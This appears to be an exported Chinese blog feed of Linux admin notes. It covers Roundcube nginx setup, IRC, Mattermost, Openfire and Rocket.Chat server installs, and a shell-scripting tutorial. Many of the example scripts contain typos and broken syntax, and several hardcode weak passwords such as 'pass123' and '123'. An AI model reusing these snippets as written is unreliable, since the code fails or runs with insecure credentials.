ALL PRIVILEGES ON routecubemail.* 'roundcube'@'loocalhost'; FLUSH PRIVILEGES; 导入数据 # 当前目录下的SQL文件夹下的sql文件（针对不同类型的数据库进行导入） mysql -u roundcube -p roundcubedb &lt; SQL/mysql.initial.sql 4.配置站点文件# 这里使用默认的配置文件 vim /etc/nginx/sites-avaialable/default location /webmail { root /var/www/html;s index index.php; location ~ ^/webmaik/(.+\.php)$ { root /var/www/html; try files $uri=404; fastcgi_index index.php; fastcgi_pass unix:/run/php/php7.2-fpm.sock; fastcgi_param SCRIPT_FILENAME $document_root $fastcgi_script_name; include /etc/nginx/fastcgi_params; } location ~ ^/webmail/(README|INSTALL|LICENSE|CHANGELOG|UPGRADING)$ { deny all; } location ~ ^/webmail/(bin|SQL|config|temp|logs)/ { deny all; } } 检查配置 nginx -t 重启服务 systemctl restart nginx 5.权限chown -R www-data:www-data /var/www/html/webmail chmod 755 /var/www/html/webmail/temp /var/www/html/webmail/logs 6.Web安装阶段# 访问路径 http://mail.qq.com/webmail/installer ## 检查环境 # 一些组件可能没安装，可以安装 apt install php-dompdf apt install php7.2-xml ## 创建配置文件 ... # IP检查 # 设置数据库密码 # managesieve # ...具体的自己看配置 ## 初始化数据库 删除installer目录 登录Web Mail ## 访问web界面 http://mail.qq.com/webmail document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>邮件服务</tag>
        <tag>ubuntu server</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu sever-聊天服务]]></title>
    <url>%2Fposts%2F43174%2F</url>
    <content type="text"><![CDATA[聊天服务与IRC服务 沟通是最重要的问题 发明网络的目的的沟通(信息交换) 高效的沟通是生产力 为什么不用QQ、微信、Telegram？ 企业信息流经他人服务器（泄密） 内部信息内部传递效率更高 更专注于公司内部工作内容 IRCInternet Relay Chat（因特网中继聊天）是一种通过网络的群体即时聊天方式（也可以用于个人间聊天）公开的协议（TCP和SSL协议）IRC服务器可以连接其他的IRC服务器形成一个IRC网络大多数的IRC服务器不需要客户注册登录目前已经很少见（黑客和老牌的技术群体的挚爱）部分流服务商依赖IRC协议进行信息传递 IRC服务器的搭建Ircd-Hybrid为例 安装配置简单 系统资源占用低 1.安装 # 安装服务端 sudo apt install ircd-hybrid 2.管理员口令(operator) # 设置管理员的密码（加密的方式保存密文） mkpaswd pass123 # 生成密文，一会在后面用 3.配置 # sudo vim /etc/ircd-hybrid/ircd.conf serverinfo { name = "irc.lab.com" description = "LAB Campany IRC Server" network_name = "This is my Beijing Office IRC Network" # 其他配置项... } operator { # 管理员的片段（默认是注释的） name = "admin" user = "*@*"; # 限制可以连接的用户和ip地址，这里是所有用户所有主机 password = "xxxxxx" # 上面mkpaswd pass123 生成的密文 } # 后面根据需要配置 4.Banner sudo vim /etc/ircd-hybrid/ircd.motd # 客户端登录信息的信息 5.重启服务 sudo systemctl restart ircd-hybrid.service 6.客户端 - mIRC # Win下的一款商业软件 - irssi # Linux下常用 # 安装 sudo apt install irssi sudo apt install ident2 # 服务端才能访问该客户端的计算机名等信息 # 客户端直接连接服务端就行 irssi -c 192.168.175.130 # 服务端口，默认 666x 7.客户端基本命令 /help # 查看所有命令 /help channel /opera admin pass123 /channel list # 查看频道 /channel add -auto #Football # 添加频道 /join #Football # 加入指定的聊天室 # 把自己提升为管理员身份 /oper admin pass123 MatterMost服务搭建 irssi这种命令行的方式并不是很友好，MatterMost使用十分友好 团队群聊SaaS平台 Go语言开发 独立与操作系统的二进制部署方案(它已经给打包好了) 基于MySQL、Postgresql数据库 Slack(收费)的替代选择方案(兼容Slack，二者可进行通信) 全平台客户端支持（Web） 免费版、收费版 适用于企业内部团队文件共享和信息交换 服务端：https://github.com/mattermost/mattermost-server客户端程序：https://github.com/mattermost/desktopWeb界面的：https://github.com/mattermost/mattermost-webapp 安装部署1.安装数据库 # 这里以mysql为例 sudo apt install mysql-server sudo mysql_secure_installation 2.建库 create user 'muser'@'%' identified by '12345678'; create database mattermost; grant all privileges on mattermost.* to'muser'@'%'; -- GRANT ALTER,CREATE,DELETE,DROP,INDEX,INSERT,SELECT,UPDATE ON mattermost.* to'muser'@'%'; flush privileges; 3.下载mattermost wget https://releases.mattermost.com/5.24.2/mattermost-5.24.2-linux-amd64.tar.gz tar -zxvf mattermost*.gz sudo mv mattermost /opt # 个人安装的软件包，一般会放到opt下面 sudo mkdir /opt/mattermost/data cd /opt 4.权限设置 sudo useradd -rU mattermost sudo chown -R mattermost:mattermost /opt/mattermost sudo chmod -R g+w /opt/mattermost 5.配置文件 # sudo vim /opt/mattermost/config/config.json # 这里配置数据库项， mattermost库的名字 "DriverName": "mysql" "DataSource": "muser:passw123@tcp(localhost:3360)/mattermost?charset=utf8mb4,utf8&amp;readTimeout=30s&amp;writeTimeout=30s" 6.测试数据库连接 sudo -u mattermost /opt/mattermost/bin/mattermost # 重点关注端口是否正常开启，一般默认为8065端口 7.Systemd 服务单元文件 # mattermost本身是不带service的，所以我们可以手动创建 sudo touch /lib/system/mattermost.service # 添加内容... 8.中文字体 # sudo vim /opt/mattermost/config/config.json "DefaultServerLocale": "zh-CN" "DefaultClientLocale": "zh-CN" "AvailableLocale": "zh-CN" 9.启动服务 sudo systemctl daemon-reload # 修改完再启动服务 sudo systemctl start mattermost.service sudo systemctl enable mattermost.service # 然后查看服务 sudo systemctl status mattermost.service 10.Web配置 # 域名根据自己的来，或ip也行 https://chat.lab.com:8065 # 首个账号被赋予system_admin角色（管理员） 建议：先建立一个团队(相当于一个聊天室) 然后可以根据提示下载客户端 11.系统控制台配置 常规->服务端口(先指定页面上的命令，再在web界面修改)，证书，地址，data存储目录(本地存储/云存储),电子邮件通知 sudo setcap_net_bind_service=+ep./bin/mattermost # 修改服务端口 12.使用 # 别人进来的方式： 1.邀请链接 2.单独添加成员 # 客户端： - Web版 - 其他操作系统客户端 # 支持其他插件，可以与第三方软件集成使用 文件的传送，共享文件，置顶文件 Openfire服务搭建开源免费的IM即时通信服务器Real-time collaboration(RTC)由java开发，需要java运行环境使用拓展通讯和表示协议（XMPP）Extensible Messaging and Presence Protocol号称单台服务器可支持上万并发用户兼容所有支持XMPP协议的客户端(spark),不建议web的方式(基于flash)支持插件开发支持mysql、postgrersql、内建数据库支持LDAP、TLS、群集部署 搭建服务端1.java环境 sudo apt-get install openjdk-8-jdk java -version 2.数据库 # 这里以mysql为例 sudo apt install mysql-server sudo mysql_secure_installation 3.建库 create database openfire; grant all privileges on openfire.* to'fireuser'@'%' identified by 'pass123'; flush privileges; 4.下载，安装 # http://www.igniterealtime.org/downloads/index.jsp#openfire sudo dpkg -i openfire.deb 5.导入数据库表 sudo mysql; show databases; use openfire; source /usr/share/openfire/resources/databases/openfire_mysql.sql show tables; 6.Web界面配置 ## http://openfire.lab.com:9090 #进行常用配置 #数据库URL路径： 地址:端口:库名 jdbc:mysql://127.0.0.1/openfire?useUnicode=true&amp;chasacterEncoding=UTF-8&amp;characterSetResults=UTF-8&amp;rewriteBatchedStatements=true # 通过Web进入管理界面 7.创建用户账号 客户端可以使用sparkhttp://www.igniterealtime.org/downloads/index.jsp#openfire客户端登录忽略证书爆粗平spark使用5222端口连接服务端 Rochet Chat服务搭建与Mattermost类似团队群聊SaaS平台Slack的替代选择方案全平台客户端支持(WEB)适用于企业内部文件共享和信息交换独立于操作系统的Snap部署方式 安装安装异常简单 F1.自动安装# 推荐 sudo snap install rocketchat-server F2.手动安装1.安装数据库 sudo apt install mongodb 2.安装依赖 sudo apt install node.js build-essential npm 3.指定Node.js版本 sudo npm install -g n sudo n 8.9.3 # 这里的版本自己查看一下目前支持的版本号 4.下载服务端源码，并安装 # 下载地址： https://releases.rocket.chat/latest/download tar -zxcf xxx.tgz cd bundle/programs/server npm install cd ../ export ROOT_URL=http://1.1.1.1：3000/ export MONGO_URL=mongodb://localhost:27017/rocketchat export PORT=3000 node main.js # 启动服务端程序 5.访问Web页面 # 向导页面 创建账号等配置（第一个账号是管理员） 6.用户访问3000的地址，可以注册账号，加入聊天等 7.配置数据库集群（自己查，生产环境建议配置） 生产环境数据库复制集群 Note：数据库建议使用单独的服务器 系统中文显示 此为补充知识点 # 先安装中文语言包 sudo apt install language-pack-zh-hans locale -a # 配置中文语言环境变量 vim /etc/environment LANG="zh_CN.UTF-8" LANGUAGE="zh_CN:zh:en_US:en" # 配置中文，英文还是会继续使用的 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ubuntu server</tag>
        <tag>聊天服务</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2Fposts%2F1%2F</url>
    <content type="text"><![CDATA[title: shell脚本基本知识categories: Linuxtags: Linux Shellabbrlink: 44249date: 2020-03-16 17:01:17keywords:description: 应用场景 自动批量系统初始化（update，软件安装，时区设置，安全策略…） 自动化批量软件部署程序（LAMP/LNMP/Apache/LVS/Nginx) 管理应用程序（KVM，集群管理扩容，MySQL， DELLR720批量RAID） 日志分析处理日志（PV,UV, 200,!200, top 100/ grep, awk） 自动化备份恢复程序(MySQL完全/增量备份 + Crond) 自动化管理程序(批量远程修改密码，软件升级，配置更新) 自动化信息采集及监控程序（实时地收集系统/应用的状态信息:CPU,Mem,Disk,Net…） 配合zabbix信息采集（实时地收集系统/应用的状态信息:CPU,Mem,Disk,Net…） 自动化扩容（增加云主机-&gt;部署应用） Zabbix监控CPU 80% + 调用Python的api 对AWS/EC2，ESC(增加 /删除云主机)+ Shell 脚本（业务上线） 程序的组成： 逻辑 + 数据 基本用法一.常识1.输入输出重定向 ## 文件描述符：0，1,2 (对应：进程输入的文件，进程输入的文件，进程打开错误的文件) 0表示标准输入 1表示标准输出 2表示标准错误输出 ## 输入输出重定向 # >, >> > 默认为标准输出重定向，与 1> 相同 2>&amp;1 把标准错误输出 重定向到 标准输出. &amp;>a.txt 把标准输出 和 标准错误输出 都重定向到文件中 # 2>, 2>> 错误输出最佳 # 2>>&amp;1, &amp;> 描述符为2的内容输入到描述符为1的内容(&amp;> 是混合输出) cat &lt; /etc/hosts #（没加任何参数） 和不加&lt;的机制不一样 cat &lt; /etc/hosts > test/aaa.txt # 相当于copy文件内容 cat &lt;&lt; EOF # 输入内容让cat来执行 cat &lt;&lt;EOF > file1 # 把一会输入的文件放到文件里面去 # 混合重定向 输出到/dev/null就是什么都不显示到终端 &amp;> /dev/null 2.一些快捷键 # ^R 搜索历史命令 # ![number] 执行历史命令中编号为`number`的命令 # ! string 找到最近一个以指定str开头的命令, 如：!da # !! 上一个命令（在脚本中是不能手动按方向键的） # !$ shell上一个命令的最后一个参数， 比如：ls aaa/bb /etc/passwd, 再执行： head !$, 看到是的passwd的内容 # ^D 退出 # ^A 跳到最前 # ^E 跳到最后 # ^K 向后删除 # ^U 向前 删除 # ^Y 撤销 # ^L # ^S 锁屏暂停 # ^Q 恢复 3.在bash程序中嵌入一个python代码 #!/bin/bash # 第一行不是注释， 声明用哪个解释器 #! ping -c1 114.114.114.114 &amp;&amp; echo "114.114.114.114 is up" || echo "114.114.114.114 id down" # &lt;&lt;-DOF：EOF是开始结束的标识（小横杠代表以下按tab,下面的py代码可以不tab缩进), EOF是不成文的规范 # 整个程序还是使用bash解释器，只不过是中间"请来一个人 - python" # 如下： /usr/bin/python3 &lt;&lt;-EOF print("hello py") EOF echo "hello bash" # 在bash中调用 python： expect # 如果在python中使用bash， 要调用os.system('系统命令') 没有-的话，EOF作为结束符，前面不能有任何tab制表符。有-的话，EOF作为结束符，前面可以有tab制表符,容错率更高一点。 4.配合figlet打印菜单: #!/bin/bash cat &lt;&lt;EOF +-----------------------------------------------------+ | _ | | _ __ ___ __ _ _ __ _ _ __ _| | | | | '_ \` _ \ / _\` | '_ \| | ||/ _\` | | | | | | | | | | (_| | | | | |_| |(_| | | | | |_| |_| |_|\__,_|_||_|\__,_|\__,_|_| | | | +-----------------------------------------------------+ EOF 5.子shell #!/bin/bash cd ~/Desktop ls # 这种做法，在终端执行完毕之后，当前目录还是没有变，因为他是在subshell （子shell中执行的） # 要想使得subshell中的生效，就要使用`.` 或者 `source` ####### 执行脚本 ./01.sh # 需要执行权限，在子shell中执行 bash 01.sh # 不需要执行权限，在子shell中执行 01.sh # 需要执行权限，在当前shell中执行 source 01.sh # 不需要执行权限，在当前shell中执行 6.shell元字符 通配符, 注意区分与正则中的元字符 #！/bin/bash # * 任意多个字符 ls /etc/net* # ? 任意一个字符 ls home/xp? # [] 匹配括号内任意一个字符 [abc] [a-z] [^a-zA-Z0-9] # ^取反 l[io]ve l[^a-z]ve # () 命令在子shell中执行 (umask 077; touch test.txt) # 不影响创建文件的权限，当前shell的umask也没有改变 # ----- 回顾，子shell： .test.sh, source x.sh # {} 集合 touch {1..9} mkdir /home/{111,222} mkdir -pv /home/{333,{aaa,bbb}, 444} cp -rv /etc/{passwd, passwd.old} # 前面的相同的路径可以写在一块，后面不同的{}起来 cp -rv /etc/passwd{,.old} # 前面的相同的路径可以写在一块，后面不同的{}起来 # \ 转义符 让元字符回归本意 echo \* echo \\ echo \ #后面紧跟回车，也就转义了回车 # -e 常规字符转变为特殊意义的： echo -e "a\tb\nc" 7.前台后台 #!/bin/bash ## &amp; (关闭xshell，对应的任务也跟着停止) sh test.sh &amp; ## nohub #任务放到后台，关闭标准输入，终端不再能够接收任何输入（标准输入）,重定向标准输出和标准错误到nohup.out中 nohup sh test.sh ## 区分`nohub`与`&amp;`: 1.&amp; 是指在后台运行，但当用户推出(挂起)的时候，命令自动也跟着退出 2.nohub 退出终端之后该进程还是有的 ## nohub与&amp;合体 #将sh test.sh任务放到后台，但是依然可以使用标准输入，终端能够接收任何输入，重定向标准输出和标准错误到当前目录下的nohup.out文件，即使关闭xshell退出当前session依然继续运行。 nohup sh test.sh &amp; ## screen apt install screen # 安装 `sleep 100000` # 先执行,然后退出终端， `screen -list` # 再次打开终端,指定这个命令，看到id `screen -r yourID` # 然后输入这个命令,一切就回来了 ## shell的会话作业机制 ctrl +c # 杀掉的是前台进程 # ^Z 放到后台， fg 调回来 kill %3 # 给当前终端作业号为3的发信号 ## jobs 查看作业 ## 管道 | # tee 管道, -a 最佳 date | tee -a date.txt # 输出到文件，同时截流（能在终端直观地看到） ## 技巧: vim里面写脚本，可以按^Z暂停，到终端敲命令，让fg返回继续 8.命令排序 ; 不具备逻辑排序 （前面执行完毕就执行后面的，不管前面成功失败与否） &amp;&amp; 前面执行成功(即返回值$?为0)就执行后面的 || 前面执行失败(即返回值$?为不为0)就执行后面的 相当于 if else 9.echo颜色输出 使用场景：给用户醒目提示 #!/bin/bash # -e 才可以 # \e[1;3x # \e[1;3x 前景色(30-37),m后面是文字 echo -e "\e[1;31mThis is a red" echo -e "\e[1;33mThis is a yellow" # 0m 恢复颜色 echo -e "\e[1;0m" echo -e "no color" ## 常用： 前面变色之后， 后面紧跟：\e[0m 不变色(后面的内容就正常了) echo -e "\e[1;31mThis is a red text. \e[0m" echo -e "no color again" ## 背景色(40-47) echo -e "\e[1;41mThis is a red text background coloe. \e[0m" echo -e "\e[1;42mThis is a red text background coloe. \e[0m" echo -e "\e[1;43mThis is a red text background coloe. \e[0m" echo -e "\e[1;44mThis is a red text background coloe. \e[0m" echo -e "\e[1;45mThis is a red text background coloe. \e[0m" # printf 也是，不过是加了输出格式 10.切换用户 # 切换用户尽量加 - su - xxx # 加横线， shell的环境也跟随改变 （login shell） ； 执行的是前四个: bashrc和profile su xxx # 不加横线，当前环境还是当前的 () ； 执行的是两个bashrc文件 11.关于bash的文件 ## 关于bash的文件： # 系统级别 来到shell时候执行 /etc/profile /etc/bashrc # 用户级别 来到shell时候执行 ~/.bashrc ~/.profile # 离开shell时候执行 ~/.bash_logout ~/.bash_history # 修改用户的shell usermod -s /bin/bash xps # 下面两个 # login shell # nologin shell # /bin/bash # /sbin/nologin 12.其他 # shift 使位置参数向左移动，默认移动1位，可以使用shift2 while [ $# -ne 0 ] do let sum+=$i shift # shift 2 done echo "$sum" 二.变量位置变量脚本执行时，后面的第几个参数 $1 后面第一个参数 $2 $3 ${10} ## 比如下面的例子; # bash test.sh 111 222 333 ping -c1 $1 &amp;>/dev/null if [ $? -eq 0 ] # 如果`上一条命令`返回值等于0(正常执行) -eq then echo "$1 is up" else echo "$1 is down" fi 预定义变量$0 # 脚本名 $* # 所有的参数 $@ # 所有的参数 $# # 参数的个数 $$ # 当前进程的PID echo $$ $! # 上一个`后台`进程的PID $? # 上一个命令的返回值（0为成功） ping 文件 # 如果用户没有加参数 if [ $# -eq 0 ];then echo "usage: file `basename $0` need parmter" exit fi 如果是文件 -f # 第一个参数如果不是文件 if [ ! -f $1 ];then echo "not a file" exit fi ## # 第一个参数是文件，从中读取ip然后ping for ip in `cat $1` do ping -c1 ip $>/dev/null if [ $? -eq 0 ];then echo "$ip is up" else echo "$ip is down" fi done ## # basename 始终显示路径最后一个文件 # dirname 始终显示路径前面目录的名字 环境变量export ## 在系统配置中用的多 # 例如：自己添加环境变量：到/etc/profile PATH=$PATH:/new/bin export PATH # 然后sourcess # 查看环境变量 echo $PATH echo UID echo $SHELL echo $USER echo $HISTORY #历史记录命令默认记录1000条 # 显示所有的环境变量： env # 取消环境变量： unset 变量名 自定义变量作用范围：当前shell中生效(a.sh或bash a.sh)， 子shell中不行 ## 转为环境变量 export (在一个脚本文件中export， 在另一个脚本中就可以获取了) export ip1 ## ps: 自己没必要定义环境变量 F1: 先 .test.sh 再echo $ip1 F2: 或者在一个脚本中引用加载另外一个脚本(./test.sh)，后面就可以用了（没必要在每个文件中都定义一遍变量） 变量的赋值1.显式赋值 （变量要以字母或者下划线开头，数字不可以开头） ## 常规赋值 # shell中没有数据类型，都是字符串 ## 命令替换, 先把这个命令执行一遍再赋值: 反引号 ` `, $() today = `date + %F` 2.read读取赋值 ## -p提示信息。-t等待时间。-n只要前面几个字符 # read -p "提示信息： " 变量名 # read -t 5 -p "提示信息： " 变量名 # read -n 2 变量名 # read 可以同时跟多个变量。空格隔开，直接一次性赋值 read -p "输入姓名，年龄，性别[e.g zhangsan 20 m]： " name age gender echo "your name: $name, your age $age, your gender $gender" ### 注意事项： "" # 弱引用(里面可以放变量$ip) '' # 强引用（里面不能引用变量,会原样输出） ### 命令替换： `` 等价于 $(), 里面的命令会先执行 使用变量 变量赋值，等号两边不能有空格 ping -c1 $ip &amp;>/dev/null &amp;&amp; echo "$ip is up" || echo "$ip is down" 变量引用## 引用 1. $变量 2. ${变量} # 大括号简单理解为：防止歧义 变量的运算 使用场景：内存使用, ping次数等 … … ## 1.整数运算 90%以上 # 方法1： expr + - \* / % expr 1+2 expr $num1 + $num2 # 方法2： $(()) + - * / % echo $(($num1+$num2)) echo $((num1+num2)) echo $((5-3*2)) echo $(((5-3)*2)) echo $(((2**3)) echo $(((1+2));echo $sum # 方法3： $[] + - * / % echo $[5+2] echo $[5**2] # 方法4： let 使用最多 let sum=2+3;echo $sum let i++;echo $i ## 2.小数运算 echo "2*4"|bc echo "2^4"|bc echo "scale=2;6/4"|bc awk 'BEGIN{print 1/2}' echo "print 5.0/2"|python 变量的删除/替换 使用场景：让你输入值但是你没输入，我就给你一个默认值 ### 删除 url="www.baidu.com" echo ${#url} # 从前往后，井号，输出长度， 最短匹配 echo ${url#www.} # 把前面部分删除 echo ${url#*baidu.} # 把前面部分删除 * echo ${url##*.} # 从前往后，贪婪匹配，最长匹配 echo ${url%.} # 从后往前, 最短匹配 echo ${url%%.} # 从后往前，贪婪匹配 ### 切片 echo ${url：0:5} # echo ${url：5:5} # 从5开始，拿5个 echo ${url：5:} ### 变量内容的替换 url="www.baidu.com" echo ${url/baidu/sina} # 百度换成新浪 echo ${url/n/N} echo ${url//n/N} # 贪婪匹配 ## ${变量名-新变量值} # 替代(没赋值；如果变量之前有值即便是空值就不能替代) unset var1 echo ${var1-aaa} ## ${变量名:-新变量值} # 没赋值或者为空，就可以替代；如果变量之前有值就不能替代 ### 拓展： ${变量名+新变量值} ${变量名:+新变量值} ${变量名=新变量值} ${变量名:=新变量值} ${变量名?新变量值} ${变量名:?新变量值} #### 自增自减 # i++ # ++i ## 对变量值的影响： 没啥区别 ## 对表达式值的影响： ++i 先自增再赋值， i++ 先赋值在自增 三.条件判断if shell中最核心的 1.文件测试 [操作符 + 文件或目录] 命令格式1：test # 比如判断文件是否存在，如果存在就备份(概念版) back_dir=/var/mysql_bak if ! test -d $back_dir;then # 条件测试语句test， 如果不是目录或者这个目录不存在 mkdir -p $back_dir fi echo "开始备份..." # 执行 bash -vx test.sh -vx可以看详细执行过程 命令格式2： [ -d /home ] 方括号取代了test(注意有空格) # man test， 帮助文档相同。 前半边是命令[, 后半边]只是一个符号 back_dir=/var/mysql_bak if [ ! -d $back_dir ];then # 如果不是目录或者这个目录不存在 mkdir -p $back_dir fi echo "开始备份..." 命令格式3： [[ -d /home ]] # [ -e dir|file ] -d 是否是目录 -f 是否为文件 -r `当前用户`是否对该文件有读权限 -w -l 是否是链接 -b 是否为设备文件 -c 是否为字符设备 # [ ! -d /cc ] &amp;&amp; mkdir /cc # 当前不是一个目录或者目录如果不存在，就创建 [ -d /ccc ] || mkdir /ccc # 当前是一个目录或者目录如果存在，就不创建 2.数值比较 # [ 1 -gt 10 ] 大于 -lt 小于 -eq 等于 -ne 不等于 -ge >= -le &lt;= #安装软件，先判断是否为root用户 if [ $UID -ne 0 ];then # $UID不等于0，代表不是root用户(数值比较) echo "你没有权限!" exit fi apt install apache2 例子：用户输入(read)用户名，创建这个用户 read -p "input the user name: " user id $user &amp;>/dev/null if [ $? -eq 0 ];then # 如果用户存在 echo "user $user already exists" else useradd $user if [ $? -eq 0 ];then echo "$user is created." fi fi 例子2： 如果磁盘是使用量超过90%， 就报警 # grep'/$' 是提取根分区， $(NF) 是倒数第一列， awk是以什么分割 dick_use=`df -Th |grep'/$'|awk '{print $(NF-1)}'|awk -F"%" '{print $1}'` mail_user=alice warn_file=/tmp/disk_warn.txt if [ $dick_use -gt 90 ];then echo "`date +%F:%H` disk: ${dick_use}%" >warn_file fi if [ -f $disk_warn ];then # 将报错文件发送给邮件用户 mail -s "disk warning..." $mail_user &lt; $dick_use # |mail -s 邮件主题 rm -rf $disk_warn fi # 可以用crontab，定时执行（crontab -e会把所有的任务清除） # 换行是 \ 3.字符串比较 = == != [ -n "hhh" ] # 长度不是0 [ -z "$user" ] # 长度为0 (变量为空/未定义 => 都是0) -a # 并且 [1 -lt 1 -a 5 -gt 10] -r # 或者 &amp;&amp; || if [ $USER != 'root' ];then # $USER不等于root(字符串比较) echo "你没有权限!" exit fi apt install apache2 例子：批量创建用户 #尽量使用双引号引起来 #[ "$USER" = "root" ] #!/bin/bash ################################## #脚本规范 # #useradd # #V1.0 by xps 01/03/2020 # ################################## read -p "Please input number: " num # read -p "Please input 前缀: " prefix while true do # 对用户输入进行过滤（数字） ^[0-9]+$ 正则 =~ (模式串不能带双引号) #if [[ ! "$num" =~ ^[0-9]+$ || "$num" =~ ^0+$ ]];then # []单个方括号不支持正则，用[[ 变量 =~ 模式 ]] if [[ "$num" =~ ^[0-9]+$ ]];then break else read -p "不是数字，Please input number again: " num fi done read -p "Please input 前缀: " prefix while true do if [ -n "$prefix" ];then # 如果长度为非0 break else read -p "Please input 前缀: " prefix fi done # man seq 打印序列： seq 1 2 10 (区间，步长) for i in `sql $num` do user=$prefix$i useradd $user echo "123" |passwd --stdin $user # --stdin 前面输出的当做标准输入 if [ $? -eq 0 ];then echo "$user is created." fi done # declare 可以定义数据类型。但是一般不用，因为都是字符串 ## 语法不难，主要是对Linux系统以及命令的熟悉。 # if后门紧跟的不一定是方括号，只要是能返回true/false的就行 if [[ condition ]]; then #statements elif [[ condition ]]; then #statements elif [[ condition ]]; then #statements fi switch语法结构 case 变量 in 模式1) # 都是字符串， 可以用通配符 (尽量使用双引号) 命令序列1 ;; 模式2) 命令序列2 ;; 模式3) 命令序列3 ;; *) 无匹配后命令序列 esac 例子1：删除用户 read -p "请输入要删除的用户名： " user id $user &amp;>/dev/null if [ &amp;? -ne 0 ];then echo "no suc user: $user" exit 1 # 返回1（意思是错误退出） fi read -p "你确定要删除用户: $user 吗 ?[y/n]: " action case "$action" in y|Y|yes|YES) userdel -r $user echo "deleted user: $user success!" ;; *) echo "error" esac 例子2： 判断一个东西是不是命令 # command -v xxx # echo $? 返回为0就是 command -v ls cmd1=/bin/date if command -v $cmd1 &amp;>/dev/null;then # 神马都不做： 只加一个冒号 : else echo "$cmd1 是一个命令" fi 例子3：通过登录堡垒机/跳板机 jumpserver ，然后登录内网的服务器 （简易版） # 1.先登录到跳板机(普通账号) # 2.跳板机登录到other server（） # 登录两次，有点麻烦 # 例子： 先登录到跳板机，再通过选项选择要登录到哪台服务器（1.密码认证 2.秘钥认证:以用户xps身份做 ssh-keygen, ssh-copy-id web1） # 以xps身份登录上来， 秘钥登录服务器 # 脚本放到/home/xps/jumpserver.sh, 放到bashrc，登录这台机器就执行，并且禁止用户(^C)退出 trap "" HUP INT OUIT TSTP # 捕捉键盘信号，然后啥也不做(^C也退出不了) ,让他登录跳板机不能干别的 web1=192.168.0.111 web2=192.168.0.112 web3=192.168.0.113 cat &lt;&lt;-EOF +---------------------------+ | 1. web1 | | 2. web2 | | 3. mysql1 | +---------------------------+ EOF echo -en "\e[1;32minput number: \e[0m" # 显示颜色, -n不换行 read num while true do case "$num" in 1) ssh xps@$web1 ;; 2) ssh xps@$web2 ;; 3) ssh xps@$mysql1 ;; "") # 用户啥也没输入 true *） echo "error" esac done ## 生产环境 #1. 业务服务器不允许直接连接，允许通过跳板机连接 #2. 业务服务器不允许root用户直接登录 ### 复杂版jumpserver(对用户行为进行行为/记录) ---> 使用Python脚本 例子4：实现系统管理工具箱 #!/bin/bash ## 实现系统管理工具箱 # 定义一个函数 menu{ cat &lt;&lt;-EOF ########################################## # h. help # # f. disk partion # # d. filesystem mount # # m. memory # # u. system load # # q .exit # ########################################## EOF } menu while true do read -p "Please input[h for help]: " action case "$action" in h) clear; menu;; f) fdisk -l;; d) df -Th;; m) free -m;; u) uptime;; q) break;; "") ;; *) echo "error";; esac done echo "finish..." 各种符号#!/bin/bash () # 在子shell中执行 ((1&lt;2)) # C语言风格的比较 $(date) # touch $(date +%F)_file.txt 先执行里面的命令再执行外面的 $(()) # 运算 {} # 集合{1..5} ${} # 变量的引用 [] # 条件测试 逻辑符号 [ a -a b ] [[]] # 升级版的。 支持正则匹配 [[ =~ ]]， 逻辑符号 [[ a &amp;&amp; b ]] $[] # 整数运算 ####### 执行脚本 ./01.sh # 需要执行权限，在子shell中执行 bash 01.sh # 不需要执行权限，在子shell中执行 01.sh # 需要执行权限，在当前shell中执行 source 01.sh # 不需要执行权限，在当前shell中执行 ###### 调试脚本 sh -n 02.sh # 仅调试syntax error sh -vx 02.sh # 仅调试的方式执行，查询整个执行过程 四.循环for循环 处理固定循环的时候，for有优势 形式 for 变量名 [ in 列表 ] do 循环体 done 拓展： 查看脚本运行时间: time ./a.sh 例子1： for循环ping机器 # 重定向 >ip.txt # {2..254} 集合， 另一个序列: seq `2 254` for i in {2..254} do { $ip = 192.168.111.$i ping -c1 -W1 $ip &amp;>/dev/null # -W等待多少时间 if [ $? -eq 0 ]; then echo "$ip" | tee -a ping.txt fi }&amp; # 用大括号和&amp;, 把整个循环【放到后台】 done wait # 等待前面的所有【后台】进程结束，再执行后面的 echo "finish !" 例子2：从文件中读取主机，然后ping # {2..254} 集合， 另一个序列: seq `2 254` for ip in `cat ips.txt` do ping -c1 -W1 $ip &amp;>/dev/null # -W等待多少时间 if [ $? -eq 0 ]; then echo "$ip is up!" else echo "$ip is down!" fi done wait # 等待前面的所有【后台】进程结束，再执行后门的 echo "finish !" 例子3：批量创建账号 while : do read -p "input your prefix &amp; passwd &amp; number : " prefix passwd number printf "user information: --------------------------- username: $passwd prefix: $prefix number: $number --------------------------- " read -p "Are you sure?[y/n]" action if [ "$action" = "y" ];then break fi done echo "continue ..." # 然后是接下来的功能 for i in `seq -w $number` do user = $prefix%i id $user &amp;>/dv/null if [ $? -eq ];then echo "user $user already exists" else useradd $user echo "$passwd" | --stdin $user # 将密码作为标准输入 if [ $? -eq 0 ];then echo "$user is created." fi fi done # bash -n .sh 检查脚本错误 例子4：批量创建账号（从文件中） passwd = 123 # 必须要输入文件 if [ $# -eq 0 ];then echo "usage: `basename $0` file" exit fi # 判断输入的是否是文件 if [ ! -f $1 ];then echo "error file" exit 2 fi # 开始(两列 -- > 把密码和用户名分开) # 应该：重新定义分隔符 # IFS内部字段分隔符,比如下面的回车 # IFS = $'\n' for line in `cat $1` # 位置变量 , for对空行不感冒 do # 长度为0就跳过 if $[ ${#line} -eq 0 ];then echo "Nothing to do." continue fi user = `echo "$line" |awk 'print &amp;1'` pass = `echo "$line" |awk 'print &amp;2'` id $user &amp;>/dv/null if [ $? -eq ];then echo "user $user already exists" else useradd $user echo "$pass" | --stdin $user &amp;>/dev/null # 将密码作为标准输入 if [ $? -eq 0 ];then echo "$user is created." fi fi done 例子5：批量修改密码(剩下的功能自己完善) # 